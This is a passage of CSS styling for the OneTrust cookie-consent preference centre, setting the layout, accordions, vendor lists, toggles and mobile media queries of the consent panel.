      #onetrust-pc-sdk .ot-fltr-scrlcnt {
        overflow-y: auto;
        overflow-x: hidden;
        clear: both;
        max-height: calc(100% - 60px)
      }

      #onetrust-pc-sdk .ot-fltr-opt {
        margin-bottom: 25px;
        margin-left: 15px;
        clear: both
      }

      #onetrust-pc-sdk .ot-fltr-opt label {
        height: auto
      }

      #onetrust-pc-sdk .ot-fltr-opt span {
        cursor: pointer;
        color: dimgray;
        font-size: .8em;
        line-height: 1.1;
        font-weight: normal
      }

      #onetrust-pc-sdk #clear-filters-handler {
        float: right;
        margin-top: 15px;
        margin-bottom: 10px;
        text-decoration: none;
        color: #3860be;
        font-size: .9em;
        border: none;
        padding: 1px
      }

      #onetrust-pc-sdk #clear-filters-handler:hover {
        color: #1883fd
      }

      #onetrust-pc-sdk #clear-filters-handler:focus {
        outline: #000 solid 1px
      }

      #onetrust-pc-sdk #filter-apply-handler {
        margin-right: 10px
      }

      #onetrust-pc-sdk .ot-grp-desc+.ot-leg-btn-container {
        margin-top: 0
      }

      #onetrust-pc-sdk .ot-leg-btn-container {
        display: inline-block;
        width: 100%;
        margin-top: 10px
      }

      #onetrust-pc-sdk .ot-leg-btn-container button {
        height: auto;
        padding: 6.5px 8px;
        margin-bottom: 0;
        line-height: normal;
        letter-spacing: 0
      }

      #onetrust-pc-sdk .ot-leg-btn-container svg {
        display: none;
        height: 14px;
        width: 14px;
        padding-right: 5px;
        vertical-align: sub
      }

      #onetrust-pc-sdk .ot-active-leg-btn {
        cursor: default;
        pointer-events: none
      }

      #onetrust-pc-sdk .ot-active-leg-btn svg {
        display: inline-block
      }

      #onetrust-pc-sdk .ot-remove-objection-handler {
        border: none;
        text-decoration: underline;
        padding: 0;
        font-size: .82em;
        font-weight: 600;
        line-height: 1.4;
        padding-left: 10px
      }

      #onetrust-pc-sdk .ot-obj-leg-btn-handler span {
        font-weight: bold;
        text-align: center;
        font-size: .91em;
        line-height: 1.5
      }

      #onetrust-pc-sdk.ot-close-btn-link #close-pc-btn-handler {
        border: none;
        height: auto;
        line-height: 1.5;
        text-decoration: underline;
        font-size: .69em;
        background: none;
        width: auto
      }

      #onetrust-pc-sdk.ot-close-btn-link .ot-close-cntr {
        right: 5px;
        top: 5px;
        transform: none
      }

      #onetrust-pc-sdk .ot-grps-cntr {
        overflow-y: hidden
      }

      #onetrust-pc-sdk .ot-cat-header {
        float: left;
        font-weight: 600;
        font-size: .875em;
        line-height: 1.5;
        max-width: 90%;
        vertical-align: middle
      }

      #onetrust-pc-sdk .ot-vnd-item>button:focus {
        outline: #000 solid 2px
      }

      #onetrust-pc-sdk .ot-vnd-item>button {
        position: absolute;
        cursor: pointer;
        width: 100%;
        height: 100%;
        margin: 0;
        top: 0;
        left: 0;
        z-index: 1;
        max-width: none;
        border: none
      }

      #onetrust-pc-sdk .ot-vnd-item>button[aria-expanded=false]~.ot-acc-txt {
        margin-top: 0;
        max-height: 0;
        opacity: 0;
        overflow: hidden;
        width: 100%;
        transition: .25s ease-out;
        display: none
      }

      #onetrust-pc-sdk .ot-vnd-item>button[aria-expanded=true]~.ot-acc-txt {
        transition: .1s ease-in;
        margin-top: 10px;
        width: 100%;
        overflow: auto;
        display: block
      }

      #onetrust-pc-sdk .ot-vnd-item>button[aria-expanded=true]~.ot-acc-grpcntr {
        width: auto;
        margin-top: 0px;
        padding-bottom: 10px
      }

      #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item {
        position: relative;
        border-radius: 2px;
        margin: 0;
        padding: 0;
        border: 1px solid #d8d8d8;
        border-top: none;
        width: calc(100% - 2px);
        float: left
      }

      #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item:first-of-type {
        margin-top: 10px;
        border-top: 1px solid #d8d8d8
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:first-child {
        margin-top: 10px
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:last-child,
      #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr:last-child {
        margin-bottom: 5px
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
        padding-top: 11.5px;
        padding-bottom: 11.5px;
        padding-left: 20px;
        padding-right: 20px;
        width: calc(100% - 40px);
        display: inline-block
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-acc-txt {
        width: 100%;
        padding: 0
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp-cntr {
        padding-left: 20px;
        padding-right: 15px;
        padding-bottom: 0;
        width: calc(100% - 35px)
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp {
        padding-right: 5px
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpcntr {
        z-index: 1;
        position: relative
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        right: 20px;
        margin-top: -2px
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr .ot-arw {
        width: 15px;
        height: 20px;
        margin-left: 5px;
        color: dimgray
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header {
        float: none;
        color: #2e3644;
        margin: 0;
        display: inline-block;
        height: auto;
        word-wrap: break-word;
        min-height: inherit
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr,
      #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr {
        padding-left: 20px;
        width: calc(100% - 20px);
        display: inline-block;
        margin-top: 0;
        padding-bottom: 2px
      }

      #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
        position: relative;
        min-height: 25px
      }

      #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl,
      #onetrust-pc-sdk .ot-accordion-layout h4~.ot-always-active {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        right: 20px
      }

      #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl+.ot-tgl {
        right: 95px
      }

      #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler,
      #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler+a {
        margin-top: 5px
      }

      #onetrust-pc-sdk #ot-lst-cnt {
        margin-top: 1rem;
        max-height: calc(100% - 96px)
      }

      #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info-cntr {
        border: 1px solid #d8d8d8;
        padding: .75rem 2rem;
        padding-bottom: 0;
        width: auto;
        margin-top: .5rem
      }

      #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info {
        margin-bottom: 1rem;
        padding-left: .75rem;
        padding-right: .75rem;
        display: flex;
        flex-direction: column
      }

      #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info[data-vnd-info-key*=DPOEmail] {
        border-top: 1px solid #d8d8d8;
        padding-top: 1rem
      }

      #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info[data-vnd-info-key*=DPOLink] {
        border-bottom: 1px solid #d8d8d8;
        padding-bottom: 1rem
      }

      #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info .ot-vnd-lbl {
        font-weight: bold;
        font-size: .85em;
        margin-bottom: .5rem
      }

      #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info .ot-vnd-cnt {
        margin-left: .5rem;
        font-weight: 500;
        font-size: .85rem
      }

      #onetrust-pc-sdk .ot-vs-list,
      #onetrust-pc-sdk .ot-vnd-serv {
        width: auto;
        padding: 1rem 1.25rem;
        padding-bottom: 0
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-serv-hdr-cntr,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-serv-hdr-cntr {
        padding-bottom: .75rem;
        border-bottom: 1px solid #d8d8d8
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr {
        font-weight: 600;
        font-size: .95em;
        line-height: 2;
        margin-left: .5rem
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item {
        border: none;
        margin: 0;
        padding: 0
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item button,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item button {
        outline: none;
        border-bottom: 1px solid #d8d8d8
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item button[aria-expanded=true],
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item button[aria-expanded=true] {
        border-bottom: none
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item:first-child,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item:first-child {
        margin-top: .25rem;
        border-top: unset
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item:last-child,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item:last-child {
        margin-bottom: .5rem
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item:last-child button,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item:last-child button {
        border-bottom: none
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info-cntr,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info-cntr {
        border: 1px solid #d8d8d8;
        padding: .75rem 1.75rem;
        padding-bottom: 0;
        width: auto;
        margin-top: .5rem
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info {
        margin-bottom: 1rem;
        padding-left: .75rem;
        padding-right: .75rem;
        display: flex;
        flex-direction: column
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOEmail],
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOEmail] {
        border-top: 1px solid #d8d8d8;
        padding-top: 1rem
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOLink],
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOLink] {
        border-bottom: 1px solid #d8d8d8;
        padding-bottom: 1rem
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info .ot-vnd-lbl,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info .ot-vnd-lbl {
        font-weight: bold;
        font-size: .85em;
        margin-bottom: .5rem
      }

      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info .ot-vnd-cnt,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info .ot-vnd-cnt {
        margin-left: .5rem;
        font-weight: 500;
        font-size: .85rem
      }

      #onetrust-pc-sdk .ot-vs-list.ot-vnd-subgrp-cnt,
      #onetrust-pc-sdk .ot-vnd-serv.ot-vnd-subgrp-cnt {
        padding-left: 40px
      }

      #onetrust-pc-sdk .ot-vs-list.ot-vnd-subgrp-cnt .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr,
      #onetrust-pc-sdk .ot-vnd-serv.ot-vnd-subgrp-cnt .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr {
        font-size: .8em
      }

      #onetrust-pc-sdk .ot-vs-list.ot-vnd-subgrp-cnt .ot-cat-header,
      #onetrust-pc-sdk .ot-vnd-serv.ot-vnd-subgrp-cnt .ot-cat-header {
        font-size: .8em
      }

      #onetrust-pc-sdk .ot-subgrp-cntr .ot-vnd-serv {
        margin-bottom: 1rem;
        padding: 1rem .95rem
      }

      #onetrust-pc-sdk .ot-subgrp-cntr .ot-vnd-serv .ot-vnd-serv-hdr-cntr {
        padding-bottom: .75rem;
        border-bottom: 1px solid #d8d8d8
      }

      #onetrust-pc-sdk .ot-subgrp-cntr .ot-vnd-serv .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr {
        font-weight: 700;
        font-size: .8em;
        line-height: 20px;
        margin-left: .82rem
      }

      #onetrust-pc-sdk .ot-subgrp-cntr .ot-cat-header {
        font-weight: 700;
        font-size: .8em;
        line-height: 20px
      }

      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-vnd-serv .ot-vnd-lst-cont .ot-accordion-layout .ot-acc-hdr div.ot-chkbox {
        margin-left: .82rem
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr {
        padding: .7rem 0;
        margin: 0;
        display: flex;
        width: 100%;
        align-items: center;
        justify-content: space-between
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr div:first-child,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr div:first-child,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr div:first-child,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr div:first-child,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr div:first-child,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr div:first-child,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr div:first-child {
        margin-left: .5rem
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr div:last-child,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr div:last-child,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr div:last-child,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr div:last-child,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr div:last-child,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr div:last-child,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr div:last-child {
        margin-right: .5rem;
        margin-left: .5rem
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-always-active,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-always-active,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-always-active,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-always-active,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-always-active,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-always-active,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-always-active {
        position: relative;
        right: unset;
        top: unset;
        transform: unset
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-arw-cntr,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-arw-cntr,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-arw-cntr,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-arw-cntr,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-arw-cntr,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-arw-cntr,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-arw-cntr {
        float: none;
        top: unset;
        right: unset;
        transform: unset;
        margin-top: -2px;
        position: relative
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-cat-header,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-cat-header,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-cat-header,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-cat-header,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-cat-header,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-cat-header,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-cat-header {
        flex: 1;
        margin: 0 .5rem
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-tgl,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-tgl,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-tgl,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-tgl,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-tgl,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-tgl,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-tgl {
        position: relative;
        transform: none;
        right: 0;
        top: 0;
        float: none
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox {
        position: relative;
        margin: 0 .5rem
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox label,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox label,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox label,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox label,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox label {
        padding: 0
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox label::before,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox label::before,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox label::before,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label::before,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox label::before,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label::before,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox label::before {
        position: relative
      }

      #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox input,
      #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox input,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox input,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox input,
      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox input,
      #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox input,
      #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox input {
        position: absolute;
        cursor: pointer;
        width: 100%;
        height: 100%;
        opacity: 0;
        margin: 0;
        top: 0;
        left: 0;
        z-index: 1
      }

      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp .ot-acc-hdr h5.ot-cat-header,
      #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp .ot-acc-hdr h4.ot-cat-header {
        margin: 0
      }

      #onetrust-pc-sdk .ot-vs-config .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp h5 {
        top: 0;
        line-height: 20px
      }

      #onetrust-pc-sdk .ot-vs-list {
        display: flex;
        flex-direction: column;
        padding: 0;
        margin: .5rem 4px
      }

      #onetrust-pc-sdk .ot-vs-selc-all {
        display: flex;
        padding: 0;
        float: unset;
        align-items: center;
        justify-content: flex-start
      }

      #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf {
        justify-content: flex-end
      }

      #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf.ot-caret-conf .ot-sel-all-chkbox {
        margin-right: 48px
      }

      #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf .ot-sel-all-chkbox {
        margin: 0;
        padding: 0;
        margin-right: 14px;
        justify-content: flex-end
      }

      #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf #ot-selall-vencntr.ot-chkbox,
      #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf #ot-selall-vencntr.ot-tgl {
        display: inline-block;
        right: unset;
        width: auto;
        height: auto;
        float: none
      }

      #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf #ot-selall-vencntr label {
        width: 45px;
        height: 25px
      }

      #onetrust-pc-sdk .ot-vs-selc-all .ot-sel-all-chkbox {
        margin-right: 11px;
        margin-left: .75rem;
        display: flex;
        align-items: center
      }

      #onetrust-pc-sdk .ot-vs-selc-all .sel-all-hdr {
        margin: 0 1.25rem;
        font-size: .812em;
        line-height: normal;
        text-align: center;
        word-break: break-word;
        word-wrap: break-word
      }

      #onetrust-pc-sdk .ot-vnd-list-cnt #ot-selall-vencntr.ot-chkbox {
        float: unset;
        right: 0
      }

      #onetrust-pc-sdk.otPcTab .ot-vs-selc-all.ot-toggle-conf.ot-caret-conf .ot-sel-all-chkbox {
        margin-right: 50px
      }

      #onetrust-pc-sdk.otPcTab .ot-vs-selc-all.ot-toggle-conf #ot-selall-vencntr label {
        width: 35px;
        height: 10px
      }

      #onetrust-pc-sdk.otPcTab .ot-vs-selc-all.ot-toggle-conf .ot-sel-all-chkbox {
        justify-content: flex-end
      }

      #onetrust-pc-sdk.otPcTab .ot-vs-selc-all .ot-sel-all-chkbox {
        right: unset;
        display: flex;
        align-items: center
      }

      #onetrust-pc-sdk.otPcTab .ot-vs-selc-all .ot-sel-all-chkbox #ot-selall-vencntr.ot-chkbox {
        right: unset
      }

      #onetrust-pc-sdk.otPcTab .ot-vs-selc-all .ot-sel-all-chkbox {
        margin-left: 12px
      }

      #onetrust-pc-sdk.otPcTab .ot-vs-selc-all .ot-sel-all-chkbox .sel-all-hdr {
        margin: 0 1rem
      }

      #onetrust-pc-sdk .ot-pgph-link {
        font-size: .813em;
        margin-top: 5px;
        position: relative
      }

      #onetrust-pc-sdk .ot-pgph-link.ot-pgph-link-subgroup {
        margin-bottom: 1rem
      }

      #onetrust-pc-sdk .ot-pgph-contr {
        margin: 0 2.5rem
      }

      #onetrust-pc-sdk .ot-pgph-title {
        font-size: 1.18rem;
        margin-bottom: 2rem
      }

      #onetrust-pc-sdk .ot-pgph-desc {
        font-size: 1rem;
        font-weight: 400;
        margin-bottom: 2rem;
        line-height: 1.5rem
      }

      #onetrust-pc-sdk .ot-pgph-desc:not(:last-child):after {
        content: "";
        width: 96%;
        display: block;
        margin: 0 auto;
        padding-bottom: 2rem;
        border-bottom: 1px solid #e9e9e9
      }

      #onetrust-pc-sdk.otPcTab[dir=rtl] input~.ot-acc-hdr .ot-arw,
      #onetrust-pc-sdk.otPcTab[dir=rtl] #ot-back-arw {
        transform: rotate(180deg);
        -o-transform: rotate(180deg);
        -ms-transform: rotate(180deg);
        -webkit-transform: rotate(180deg)
      }

      #onetrust-pc-sdk.otPcTab[dir=rtl] input:checked~.ot-acc-hdr .ot-arw {
        transform: rotate(270deg);
        -o-transform: rotate(270deg);
        -ms-transform: rotate(270deg);
        -webkit-transform: rotate(270deg)
      }

      #onetrust-pc-sdk.otPcTab[dir=rtl] #ot-search-cntr svg {
        right: 15px
      }

      #onetrust-pc-sdk.otPcTab[dir=rtl] .ot-chkbox label::after {
        transform: rotate(45deg);
        -webkit-transform: rotate(45deg);
        -o-transform: rotate(45deg);
        -ms-transform: rotate(45deg);
        border-left: 0;
        border-right: 3px solid
      }

      #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon {
        padding: 0;
        background-color: rgba(0, 0, 0, 0);
        border: none;
        margin: 0
      }

      @media(max-width: 767px) {
        #onetrust-pc-sdk {
          width: 100%;
          border: none
        }

        #onetrust-pc-sdk .ot-optout-signal {
          margin: .625rem
        }

        #onetrust-pc-sdk .ot-sdk-container,
        #onetrust-pc-sdk .ot-sdk-container {
          padding: 0;
          margin: 0
        }

        #onetrust-pc-sdk .ot-title-cntr {
          width: 75%
        }

        #onetrust-pc-sdk .ot-title-cntr #ot-pc-title {
          white-space: break-spaces;
          font-size: 20px;
          overflow-x: visible;
          margin-left: 10px
        }

        #onetrust-pc-sdk .ot-pc-logo {
          width: 15%
        }

        #onetrust-pc-sdk .ot-pc-logo img {
          max-height: fit-content;
          font-size: 10px
        }

        #onetrust-pc-sdk .ot-desc-cntr {
          margin: 0;
          padding-top: 20px;
          padding-right: 20px;
          padding-bottom: 15px;
          padding-left: 20px;
          position: relative;
          left: auto
        }

        #onetrust-pc-sdk .ot-desc-cntr {
          margin-top: 20px;
          margin-left: 20px;
          padding: 0;
          padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-grps-cntr {
          max-height: none;
          overflow: hidden
        }

        #onetrust-pc-sdk #accept-recommended-btn-handler {
          float: none
        }
      }

      @media(min-width: 768px) {
        #onetrust-pc-sdk.ot-tgl-with-label .ot-label-status {
          display: inline
        }

        #onetrust-pc-sdk.ot-tgl-with-label #ot-pc-lst .ot-label-status {
          display: none
        }

        #onetrust-pc-sdk.ot-tgl-with-label.ot-leg-opt-out .ot-pli-hdr {
          padding-right: 8%
        }

        #onetrust-pc-sdk.ot-tgl-with-label .ot-cat-header {
          max-width: 60%
        }

        #onetrust-pc-sdk.ot-tgl-with-label .ot-subgrp h4 {
          max-width: 58%
        }

        #onetrust-pc-sdk.ot-tgl-with-label .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp>h6 {
          max-width: 50%
        }

        #onetrust-pc-sdk.ot-tgl-with-label .ot-desc-cntr .ot-tgl-cntr:first-of-type,
        #onetrust-pc-sdk.ot-tgl-with-label .ot-cat-header+.ot-tgl {
          padding-left: 15px
        }
      }

      @media(max-width: 640px) {
        #onetrust-pc-sdk {
          height: 100%
        }

        #onetrust-pc-sdk .ot-optout-signal {
          margin: .625rem
        }

        #onetrust-pc-sdk .ot-pc-header {
          padding: 10px;
          width: calc(100% - 20px)
        }

        #onetrust-pc-sdk #ot-pc-content {
          overflow: auto
        }

        #onetrust-pc-sdk .ot-sdk-row .ot-sdk-columns {
          width: 100%
        }

        #onetrust-pc-sdk .ot-desc-cntr {
          margin: 0;
          overflow: hidden
        }

        #onetrust-pc-sdk .ot-desc-cntr {
          margin-left: 10px;
          width: calc(100% - 15px);
          margin-top: 5px;
          margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-ven-hdr {
          max-width: 80%
        }

        #onetrust-pc-sdk #ot-lst-cnt {
          width: calc(100% - 18px);
          padding-top: 13px;
          padding-right: 5px;
          padding-left: 10px
        }

        #onetrust-pc-sdk .ot-grps-cntr {
          width: 100%
        }

        #onetrust-pc-sdk .ot-pc-footer {
          max-height: 300px
        }

        #onetrust-pc-sdk #ot-pc-content,
        #onetrust-pc-sdk #ot-pc-lst {
          height: calc(100% - 322px)
        }

        #onetrust-pc-sdk.ot-close-btn-link #close-pc-btn-handler {
          position: fixed;
          top: 10px;
          right: 15px
        }

        #onetrust-pc-sdk.ot-close-btn-link .ot-pc-header {
          padding-top: 25px
        }

        #onetrust-pc-sdk.ot-close-btn-link #ot-pc-title {
          max-width: 100%
        }
      }

      @media(max-width: 640px)and (orientation: portrait) {
        #onetrust-pc-sdk #ot-pc-hdr {
          height: 70px;
          padding: 15px 0;
          width: 100%
        }

        #onetrust-pc-sdk .ot-lst-subhdr {
          width: calc(100% - 15px);
          float: none;
          bottom: auto;
          display: inline-block;
          padding-top: 8px;
          padding-left: 15px
        }

        #onetrust-pc-sdk .ot-btn-subcntr {
          float: none
        }

        #onetrust-pc-sdk #ot-search-cntr {
          display: inline-block;
          width: calc(100% - 55px);
          position: relative
        }

        #onetrust-pc-sdk #ot-anchor {
          top: 75px;
          right: 30px
        }

        #onetrust-pc-sdk #ot-fltr-modal {
          top: 81px
        }

